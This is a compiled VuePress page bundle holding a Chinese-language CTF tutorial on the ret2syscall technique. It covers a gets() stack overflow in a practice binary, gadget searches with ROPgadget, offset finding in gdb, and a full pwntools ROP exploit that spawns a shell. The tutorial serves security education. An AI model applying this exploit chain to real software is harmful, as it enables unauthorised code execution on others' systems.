(window.webpackJsonp=window.webpackJsonp||[]).push([[50],{838:function(s,t,a){"use strict";a.r(t);var n=a(105),e=Object(n.a)({},(function(){var s=this,t=s.$createElement,a=s._self._c||t;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h2",{attrs:{id:"原理"}},[s._v("原理 "),a("a",{staticClass:"header-anchor",attrs:{href:"#原理"}},[s._v("#")])]),s._v(" "),a("p",[s._v("ret2syscall 即控制程序执行系统调用来获取 shell\n什么是系统调用？")]),s._v(" "),a("ul",[a("li",[s._v("操作系统提供给用户的编程接口")]),s._v(" "),a("li",[s._v("是提供访问操作系统所管理的底层硬件的接口")]),s._v(" "),a("li",[s._v("本质上是一些内核函数代码，以规范的方式驱动硬件")]),s._v(" "),a("li",[s._v('x86 通过 int 0x80 指令进行系统调用、amd64 通过 syscall 指令进行系统调用\nmov eax, 0xb\nmov ebx, [“/bin/sh”]\nmov ecx, 0\nmov edx, 0\nint 0x80\n=> execve("/bin/sh",NULL,NULL)\n'),a("img",{attrs:{src:"/images/ret2syscall/1.jpg",alt:"1.jpg"}})])]),s._v(" "),a("h2",{attrs:{id:"例题"}},[s._v("例题 "),a("a",{staticClass:"header-anchor",attrs:{href:"#例题"}},[s._v("#")])]),s._v(" "),a("p",[s._v("链接：https://pan.baidu.com/s/19ymHlZZmVGsJHFmmlwww0w 提取码：r4el\n首先checksec 看一下保护机制")]),s._v(" "),a("p",[a("img",{attrs:{src:"/images/ret2syscall/2.jpg",alt:"2.jpg"}})]),s._v(" "),a("p",[s._v("接着使用ida打开分析")]),s._v(" "),a("p",[a("img",{attrs:{src:"/images/ret2syscall/3.jpg",alt:"3.jpg"}})]),s._v(" "),a("p",[s._v("gets函数存在明显的栈溢出，但是这次没有后门函数，NX防护也打开了，那么就要换一种套路了，通过系统调用拿到shell\n我们需要控制eax，ebx，ecx，edx的值，可以使用ROPgadget这个工具帮我们找到所需的代码片段。\n首先寻找控制 eax 的 gadgets\nROPgadget --binary ret2syscall --only 'pop|ret' | grep 'eax'")]),s._v(" "),a("p",[a("img",{attrs:{src:"/images/ret2syscall/4.jpg",alt:"4.jpg"}})]),s._v(" "),a("p",[s._v("然后寻找控制ebx的\nROPgadget --binary ret2syscall --only 'pop|ret' | grep 'ebx'，其中红色框框圈出来的能让我们控制余下的寄存器，就不用再接着找了。")]),s._v(" "),a("p",[a("img",{attrs:{src:"/images/ret2syscall/5.jpg",alt:"5.jpg"}})]),s._v(" "),a("p",[s._v("接着寻找程序中有没有int 80指令，ROPgadget --binary ret2syscall --only 'int'")]),s._v(" "),a("p",[a("img",{attrs:{src:"/images/ret2syscall/6.jpg",alt:"6.jpg"}})]),s._v(" "),a("p",[s._v("最后我们还需要找到一个字符串/bin/sh，ROPgadget --binary ret2syscall --string '/bin/sh'")]),s._v(" "),a("p",[a("img",{attrs:{src:"/images/ret2syscall/7.jpg",alt:"7.jpg"}})]),s._v(" "),a("p",[s._v("这样我们就可以构造0xb的系统调用，具体要溢出多少字节可以使用gdb动态调试获取，\ngdb ret2syscall\nb main（在main函数下断点）\nr（让程序跑起来）\nn（单步执行）\n一直走到gets函数输入字符串AAAAAAAA")]),s._v(" "),a("p",[a("img",{attrs:{src:"/images/ret2syscall/8.jpg",alt:"8.jpg"}})]),s._v(" "),a("p",[s._v("然后使用stack 35命令查看栈内容")]),s._v(" "),a("p",[a("img",{attrs:{src:"/images/ret2syscall/9.jpg",alt:"9.jpg"}})]),s._v(" "),a("p",[s._v("b8 - 4c = 6c，再加上ebp的4个字节，总共需要填充0x70个字节到返回地址\n最后成功利用的堆栈图如下")]),s._v(" "),a("p",[a("img",{attrs:{src:"/images/ret2syscall/10.png",alt:"10.jpg"}})]),s._v(" "),a("p",[s._v("exp：")]),s._v(" "),a("div",{staticClass:"language-python line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-python"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("from")]),s._v(" pwn "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v("\n\nsh "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" process"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'./ret2syscall'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\npop_eax_ret "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x080bb196")]),s._v("\npop_edx_ecx_ebx_ret "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x0806eb90")]),s._v("\nint_80 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x08049421")]),s._v("\nbin_sh "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x080be408")]),s._v("\n\npayload "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" flat"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'A'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x70")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("  pop_eax_ret"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0xb")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" pop_edx_ecx_ebx_ret"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" bin_sh"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" int_80"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\nsh"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("sendline"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("payload"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\nsh"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("interactive"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br")])])])}),[],!1,null,null,null);t.default=e.exports}}]);